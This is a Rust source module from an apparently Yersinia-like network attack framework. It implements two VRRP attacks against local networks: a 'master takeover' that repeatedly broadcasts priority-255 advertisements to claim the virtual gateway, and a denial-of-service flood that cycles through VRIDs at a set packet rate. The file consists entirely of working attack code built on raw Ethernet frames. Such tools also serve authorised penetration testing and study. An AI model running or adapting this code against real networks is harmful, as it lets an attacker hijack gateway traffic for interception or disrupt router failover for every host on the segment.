//! VRRP Attack Implementations

use super::packet::{VrrpPacket, VrrpVersion};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct VrrpMasterAttack {
    pub vrid: u8,
    pub priority: u8,
    pub virtual_ip: Ipv4Addr,
    pub version: VrrpVersion,
    pub interval_ms: u32,
}

impl VrrpMasterAttack {
    pub fn new(vrid: u8, virtual_ip: Ipv4Addr) -> Self {
        Self {
            vrid,
            priority: 255, // Highest priority
            virtual_ip,
            version: VrrpVersion::V2,
            interval_ms: 1000,
        }
    }

    pub fn build_packet(&self) -> VrrpPacket {
        let ips = vec![self.virtual_ip];
        match self.version {
            VrrpVersion::V2 => {
                let mut pkt = VrrpPacket::new_v2(self.vrid, self.priority, 1, ips);
                pkt.calculate_checksum();
                pkt
            }
            VrrpVersion::V3 => {
                let mut pkt = VrrpPacket::new_v3(self.vrid, self.priority, 100, ips);
                pkt.calculate_checksum();
                pkt
            }
        }
    }
}

#[derive(Debug, Clone)]
pub struct VrrpDosAttack {
    pub rate_pps: u32,
    pub random_vrid: bool,
}

impl VrrpDosAttack {
    pub fn new(rate_pps: u32) -> Self {
        Self {
            rate_pps,
            random_vrid: true,
        }
    }

    pub fn build_packet(&self, vrid: u8) -> VrrpPacket {
        let ips = vec![Ipv4Addr::new(192, 168, 1, 254)];
        let mut pkt = VrrpPacket::new_v2(vrid, 100, 1, ips);
        pkt.calculate_checksum();
        pkt
    }
}

#[async_trait]
impl Attack for VrrpMasterAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.interval_ms as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let vrrp_packet = self.build_packet();
            let vrrp_bytes = vrrp_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x12]); // VRRP multicast
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, vrrp_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending VRRP master packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "VRRP Master Takeover"
    }
}

#[async_trait]
impl Attack for VrrpDosAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let mut vrid = 1u8;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            if self.random_vrid {
                vrid = (vrid % 255) + 1;
            }

            let vrrp_packet = self.build_packet(vrid);
            let vrrp_bytes = vrrp_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x12]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, vrrp_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(_e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "VRRP DoS"
    }
}
